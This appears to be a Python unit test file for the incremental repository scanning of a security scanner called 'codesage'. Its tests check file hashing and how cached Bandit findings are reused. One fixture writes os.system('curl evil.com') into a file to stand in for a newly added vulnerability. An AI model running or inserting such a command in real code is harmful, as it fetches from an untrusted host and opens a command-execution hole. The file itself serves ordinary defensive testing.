"""Unit tests for Advanced Module 11: Incremental Scanning."""

from pathlib import Path
from codesage.schemas import Finding
from codesage.scanning import compute_file_hashes, scan_repo_incremental


def _make_dummy_finding(fid, fpath):
    return Finding(
        id=fid,
        file_path=fpath,
        line_number=1,
        cwe_id="CWE-78",
        severity="high",
        tool_source="bandit",
        raw_message="dummy message",
        code_snippet="os.system('x')",
    )


def test_compute_file_hashes(tmp_path):
    f1 = tmp_path / "a.py"
    f2 = tmp_path / "b.py"
    f1.write_text("print('hello')\n")
    f2.write_text("print('world')\n")

    hashes = compute_file_hashes(tmp_path)
    assert "a.py" in hashes
    assert "b.py" in hashes
    assert hashes["a.py"] != hashes["b.py"]


def test_scan_repo_incremental_no_change(tmp_path):
    f1 = tmp_path / "a.py"
    f1.write_text("import os\nos.system('ping')\n")

    hashes = compute_file_hashes(tmp_path)
    cached_finding = _make_dummy_finding("bandit:a.py:2:B605", "a.py")

    findings, new_hashes = scan_repo_incremental(
        tmp_path,
        previous_findings=[cached_finding],
        previous_hashes=hashes,
        scanners=("bandit",),
    )
    assert len(findings) == 1
    assert findings[0].id == cached_finding.id
    assert new_hashes == hashes


def test_scan_repo_incremental_file_modified(tmp_path):
    f1 = tmp_path / "a.py"
    f2 = tmp_path / "b.py"
    f1.write_text("import os\nos.system('ping')\n")
    f2.write_text("def safe(): return 42\n")

    initial_hashes = compute_file_hashes(tmp_path)
    cached_finding = _make_dummy_finding("bandit:a.py:2:B605", "a.py")

    # Modify b.py to introduce a vulnerability
    f2.write_text("import os\nos.system('curl evil.com')\n")

    findings, new_hashes = scan_repo_incremental(
        tmp_path,
        previous_findings=[cached_finding],
        previous_hashes=initial_hashes,
        scanners=("bandit",),
    )
    # a.py finding is retained, b.py finding is newly discovered
    assert any(f.file_path == "a.py" for f in findings)
    assert any(f.file_path == "b.py" for f in findings)
    assert new_hashes["b.py"] != initial_hashes["b.py"]
